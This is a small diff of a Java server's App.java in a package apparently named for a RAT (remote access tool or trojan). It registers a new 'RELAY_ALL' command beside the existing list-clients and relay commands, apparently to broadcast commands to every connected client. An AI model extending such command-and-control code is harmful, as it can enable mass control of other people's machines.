@@ -13,6 +13,7 @@ import java.util.stream.Collectors;
 import com.stoppedwumm.rat.ServerShit.Handler;
 import com.stoppedwumm.rat.commands.HelpCommand;
 import com.stoppedwumm.rat.commands.ListClientsCommand;
+import com.stoppedwumm.rat.commands.RelayAllCommand;
 import com.stoppedwumm.rat.commands.RelayCommand;
 
 public class App {
@@ -33,6 +34,7 @@ public class App {
         commandRegistry.registerCommand("LIST_CLIENTS", new ListClientsCommand());
         commandRegistry.registerCommand("RELAY", new RelayCommand());
         commandRegistry.registerCommand("HELP", new HelpCommand());
+        commandRegistry.registerCommand("RELAY_ALL", new RelayAllCommand());
         System.out.println("Server commands registered.");
     }
 
